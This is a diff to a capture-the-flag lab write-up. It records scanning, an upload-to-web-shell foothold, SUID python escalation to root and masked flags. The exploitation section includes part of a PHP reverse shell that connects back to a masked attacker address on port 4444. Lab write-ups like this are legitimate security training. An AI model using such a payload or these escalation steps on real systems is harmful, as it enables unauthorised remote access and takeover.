@@ -59,7 +59,7 @@ nmap -sS -sV -sC 10.10.120.173
 ----
 
 ## 4. Enumeration
-    Web: gobuster
+   Web: gobuster
     
 Findings:
 ```
@@ -72,9 +72,9 @@ Findings:
 
 ## 5. Exploitation
 
-    On Panel there is an upload option.
+   On /Panel there is an upload option to test if it is possible to upload a web shell.
 
-    Exploit script:
+   Exploit script:
 ```
 <?php
 $sock=fsockopen("10.21.***.***",4444);
@@ -92,7 +92,7 @@ Gained Access As: www-data
 
 ## 6. Privilege Escalation
 
-    Method: SUID
+   Method: SUID
 ```
 /usr/bin/python
 ```
@@ -108,15 +108,15 @@ Escalated To: root
 
 ## 7. Post Exploitation
 
-    Root Flag found at /root/root.txt
+Root Flag found at /root/root.txt
 
 ----
 
 ## 8. Flags / Proof
 
-    User Flag: THM{***_***_*_*****}
+User Flag: THM{***_***_*_*****}
 
-    Root Flag: THM{********_**********}
+Root Flag: THM{********_**********}
 
     
         
@@ -135,8 +135,8 @@ Escalated To: root
 
 ## 10. Notes
 
-    Time spent: [e.g., 30 minutes]
+Time spent: [e.g., 30 minutes]
 
-    Tools used: nmap, gobuster
+ Tools used: nmap, gobuster
 
-    Lessons learned: [This CTF highlighted the critical risk of insecure file upload mechanisms, where bypassing extension filters led to remote code execution. It also reinforced the importance of auditing SUID binaries, as simple misconfigurations enabled privilege escalation to root.]
+ Lessons learned: [This CTF highlighted the critical risk of insecure file upload mechanisms, where bypassing extension filters led to remote code execution. It also reinforced the importance of auditing SUID binaries, as simple misconfigurations enabled privilege escalation to root.]
